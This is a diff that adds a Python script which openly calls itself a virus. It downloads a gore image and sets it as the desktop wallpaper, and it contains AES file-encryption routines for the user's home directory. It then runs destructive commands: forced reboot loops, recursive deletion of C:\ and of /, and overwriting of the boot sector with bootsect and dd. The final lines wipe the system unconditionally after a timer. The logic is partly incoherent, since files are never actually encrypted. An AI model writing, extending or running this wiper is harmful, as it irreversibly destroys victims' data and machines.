@@ -1,0 +1,140 @@
+pip install pycryptodome requests
+import os
+import sys
+import time
+import ctypes
+import requests
+import platform
+import subprocess
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+KEY_FILE = "secret.key"
+TIMER_DURATION = 60  # 1 minute for demonstration
+GORE_IMAGE_URL = "https://i.pinimg.com/originals/63/f1/e1/63f1e173d5deb498642168e021ce5ce3.jpg"
+GORE_IMAGE_PATH = "gore_image.jpg"
+MUSIC_PATH = "music.mp3"
+
+def show_disclaimer():
+    print("DISCLAIMER:\nThis program is a virus and may destroy your PC.\nThe creator, Darkness, is not liable for any damages according to the agreement.")
+
+def is_connected_to_internet():
+    try:
+        requests.get("http://www.google.com", timeout=5)
+        return True
+    except requests.ConnectionError:
+        return False
+
+def download_gore_image():
+    if is_connected_to_internet():
+        response = requests.get(GORE_IMAGE_URL)
+        with open(GORE_IMAGE_PATH, 'wb') as file:
+            file.write(response.content)
+
+def change_desktop_background():
+    download_gore_image()
+    system = platform.system().lower()
+    if system == "windows":
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(GORE_IMAGE_PATH), 0)
+    elif system == "linux":
+        subprocess.call(["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{os.path.abspath(GORE_IMAGE_PATH)}"])
+    elif system == "darwin":
+        script = f'''
+        tell application "System Events"
+            set picture of every desktop to POSIX file "{os.path.abspath(GORE_IMAGE_PATH)}"
+        end tell
+        '''
+        subprocess.call(["osascript", "-e", script])
+    else:
+        print("Unsupported operating system.")
+
+def generate_and_store_secret_key():
+    key = get_random_bytes(32)
+    with open(KEY_FILE, 'wb') as key_file:
+        key_file.write(key)
+    return key
+
+def load_secret_key():
+    with open(KEY_FILE, 'rb') as key_file:
+        key = key_file.read()
+    return key
+
+def encrypt_file(filepath, key):
+    cipher = AES.new(key, AES.MODE_EAX)
+    with open(filepath, 'rb') as f:
+        data = f.read()
+    ciphertext, tag = cipher.encrypt_and_digest(data)
+    with open(filepath, 'wb') as f:
+        for x in (cipher.nonce, tag, ciphertext):
+            f.write(x)
+
+def decrypt_file(filepath, key):
+    with open(filepath, 'rb') as f:
+        nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]
+    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
+    data = cipher.decrypt_and_verify(ciphertext, tag)
+    with open(filepath, 'wb') as f:
+        f.write(data)
+
+def encrypt_all_files(directory, key):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            encrypt_file(os.path.join(root, file), key)
+
+def decrypt_all_files(directory, key):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            decrypt_file(os.path.join(root, file), key)
+
+def overwhelm_pc():
+    system = platform.system().lower()
+    for _ in range(100):
+        if system == "windows":
+            os.system("shutdown /r /t 0")
+        elif system in ["linux", "darwin"]:
+            os.system("sudo shutdown -r now")
+
+def destroy_pc():
+    system = platform.system().lower()
+    if system == "windows":
+        os.system("del /f /s /q C:\\*.*")
+        os.system("bootsect /nt60 ALL /force /mbr")
+    elif system in ["linux", "darwin"]:
+        os.system("sudo rm -rf /*")
+        os.system("sudo dd if=/dev/zero of=/dev/sda bs=512 count=1")
+    play_music_on_loop()
+
+def play_music_on_loop():
+    system = platform.system().lower()
+    if system == "windows":
+        os.system(f"powershell -c (New-Object Media.SoundPlayer '{MUSIC_PATH}').PlayLooping()")
+    elif system in ["linux", "darwin"]:
+        os.system(f"mpg123 -q --loop -1 {MUSIC_PATH} &")
+
+def main():
+    show_disclaimer()
+    change_desktop_background()
+
+    key = generate_and_store_secret_key()
+    home_directory = os.path.expanduser("~")
+
+    user_key = input("Enter the secret key (100 characters): ")
+    if user_key == key.hex():
+        decrypt_all_files(home_directory, key)
+        print("Files have been decrypted.")
+    else:
+        print("INCORRECT PASSWORD")
+        option = input("1. Password\n2. Kill PC?\nChoose an option: ")
+        if option == "1":
+            overwhelm_pc()
+        elif option == "2":
+            confirmation = input("This will clear all drives including startup files and destroy the boot sector.\nThe damage done will be irreversible.\nDo you want to proceed? (yes/no): ")
+            if confirmation.lower() == "yes":
+                destroy_pc()
+
+    time.sleep(TIMER_DURATION)
+    overwhelm_pc()
+    destroy_pc()
+
+if __name__ == "__main__":
+    main()
